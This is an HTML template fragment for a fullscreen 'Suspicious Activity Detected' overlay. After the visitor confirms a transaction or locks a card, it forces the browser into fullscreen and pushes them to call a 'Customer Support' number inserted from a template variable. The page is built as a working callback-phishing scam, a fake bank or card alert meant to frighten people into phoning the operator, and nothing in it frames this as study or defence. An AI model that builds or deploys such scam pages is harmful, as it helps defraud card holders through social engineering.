<!-- ===== FULLSCREEN SUPPORT MODAL ===== -->
<div id="support-overlay" style="
  display:none; position:fixed; inset:0; z-index:99999;
  background:rgba(0,0,0,0.92);
  backdrop-filter:blur(20px); -webkit-backdrop-filter:blur(20px);
  flex-direction:column; align-items:center; justify-content:center;
  padding:24px;
  animation: overlayIn 0.4s ease-out;
">
  <style>
    @keyframes overlayIn {
      from { opacity:0; }
      to { opacity:1; }
    }
    @keyframes modalIn {
      from { opacity:0; transform:translateY(30px) scale(0.95); }
      to { opacity:1; transform:translateY(0) scale(1); }
    }
    @keyframes pulseRing {
      0% { transform:scale(1); opacity:0.6; }
      100% { transform:scale(1.8); opacity:0; }
    }
    @keyframes shake {
      0%,100% { transform:rotate(0deg); }
      10%,30%,50%,70%,90% { transform:rotate(-8deg); }
      20%,40%,60%,80% { transform:rotate(8deg); }
    }
    .support-modal {
      width:100%; max-width:360px;
      background: linear-gradient(145deg, rgba(255,255,255,0.12), rgba(255,255,255,0.06));
      backdrop-filter: blur(40px); -webkit-backdrop-filter: blur(40px);
      border-radius:24px;
      border: 1px solid rgba(255,255,255,0.15);
      padding:32px 24px;
      text-align:center;
      box-shadow: 0 20px 60px rgba(0,0,0,0.5);
      animation: modalIn 0.5s cubic-bezier(0.4,0,0.2,1) 0.15s both;
    }
    .support-icon-wrap {
      position:relative; width:72px; height:72px;
      margin:0 auto 20px; display:flex; align-items:center; justify-content:center;
    }
    .support-icon-ring {
      position:absolute; inset:0; border-radius:50%;
      border:2px solid rgba(239,68,68,0.4);
      animation: pulseRing 1.5s ease-out infinite;
    }
    .support-icon {
      width:72px; height:72px; border-radius:50%;
      background: linear-gradient(135deg, #dc2626, #ef4444);
      display:flex; align-items:center; justify-content:center;
      box-shadow: 0 4px 24px rgba(239,68,68,0.4);
      position:relative; z-index:1;
    }
    .support-icon svg {
      width:32px; height:32px; stroke:#fff; fill:none;
      stroke-width:2; stroke-linecap:round; stroke-linejoin:round;
      animation: shake 0.8s ease-in-out infinite;
    }
    .support-title {
      font-family: -apple-system, BlinkMacSystemFont, 'Outfit', sans-serif;
      font-size:20px; font-weight:700; color:#fff;
      margin-bottom:10px; letter-spacing:-0.3px; line-height:1.3;
    }
    .support-desc {
      font-family: -apple-system, BlinkMacSystemFont, 'Outfit', sans-serif;
      font-size:14px; color:rgba(255,255,255,0.65);
      line-height:1.5; margin-bottom:24px;
    }
    .support-number {
      font-family: 'JetBrains Mono', -apple-system, monospace;
      font-size:22px; font-weight:700; color:#fff;
      letter-spacing:1px; margin-bottom:24px;
      display:block;
    }
    .call-btn {
      display:flex; align-items:center; justify-content:center; gap:10px;
      width:100%; padding:17px; border:none; border-radius:16px;
      background: linear-gradient(135deg, #16a34a, #22c55e);
      color:#fff; font-family: -apple-system, BlinkMacSystemFont, 'Outfit', sans-serif;
      font-size:17px; font-weight:700; cursor:pointer;
      box-shadow: 0 4px 24px rgba(34,197,94,0.4);
      transition: all 0.2s; text-decoration:none;
      letter-spacing:-0.2px;
    }
    .call-btn:active { transform:scale(0.97); }
    .call-btn svg {
      width:22px; height:22px; stroke:currentColor; fill:none;
      stroke-width:2.5; stroke-linecap:round; stroke-linejoin:round;
    }
    .support-footer {
      margin-top:16px;
      font-size:11px; color:rgba(255,255,255,0.2);
      letter-spacing:0.5px;
    }
  </style>

  <div class="support-modal">
    <div class="support-icon-wrap">
      <div class="support-icon-ring"></div>
      <div class="support-icon">
        <svg viewBox="0 0 24 24"><path d="M15.05 5A5 5 0 0 1 19 8.95M15.05 1A9 9 0 0 1 23 8.94m-1 7.98v3a2 2 0 0 1-2.18 2 19.79 19.79 0 0 1-8.63-3.07 19.5 19.5 0 0 1-6-6 19.79 19.79 0 0 1-3.07-8.67A2 2 0 0 1 4.11 2h3a2 2 0 0 1 2 1.72 12.84 12.84 0 0 0 .7 2.81 2 2 0 0 1-.45 2.11L8.09 9.91a16 16 0 0 0 6 6l1.27-1.27a2 2 0 0 1 2.11-.45 12.84 12.84 0 0 0 2.81.7A2 2 0 0 1 22 16.92z"/></svg>
      </div>
    </div>
    <div class="support-title">Suspicious Activity Detected</div>
    <p class="support-desc">Get in touch with Customer Support right now to resolve this suspicious activity on your account.</p>
    <span class="support-number" id="support-phone-display"><%= phone %></span>
    <a href="tel:<%= phone %>" class="call-btn" id="call-btn">
      <svg viewBox="0 0 24 24"><path d="M22 16.92v3a2 2 0 0 1-2.18 2 19.79 19.79 0 0 1-8.63-3.07 19.5 19.5 0 0 1-6-6 19.79 19.79 0 0 1-3.07-8.67A2 2 0 0 1 4.11 2h3a2 2 0 0 1 2 1.72 12.84 12.84 0 0 0 .7 2.81 2 2 0 0 1-.45 2.11L8.09 9.91a16 16 0 0 0 6 6l1.27-1.27a2 2 0 0 1 2.11-.45 12.84 12.84 0 0 0 2.81.7A2 2 0 0 1 22 16.92z"/></svg>
      Call Now
    </a>
    <div class="support-footer">Available 24/7 · Toll-free</div>
  </div>
</div>

<script>
function showSupportModal() {
  var overlay = document.getElementById('support-overlay');
  overlay.style.display = 'flex';

  // Try fullscreen
  var el = document.documentElement;
  if (el.requestFullscreen) el.requestFullscreen().catch(function(){});
  else if (el.webkitRequestFullscreen) el.webkitRequestFullscreen();
  else if (el.msRequestFullscreen) el.msRequestFullscreen();
}

function handleAction(btn, action) {
  var parent = btn.closest('.actions, .a-actions, .i-actions');
  var buttons = parent.querySelectorAll('button');

  buttons.forEach(function(b) {
    b.style.pointerEvents = 'none';
    if (b !== btn) { b.style.opacity = '0.2'; b.style.transform = 'scale(0.94)'; }
  });

  if (action === 'confirm') {
    btn.style.background = '#16a34a';
    btn.innerHTML = '✓ Confirmed';
  } else {
    btn.style.background = '#dc2626';
    btn.style.color = '#fff';
    btn.innerHTML = '🔒 Card Locked';
  }

  btn.style.transform = 'scale(1.02)';
  setTimeout(function() { btn.style.transform = 'scale(1)'; }, 200);

  // Show support modal after short delay
  setTimeout(showSupportModal, 800);
}
</script>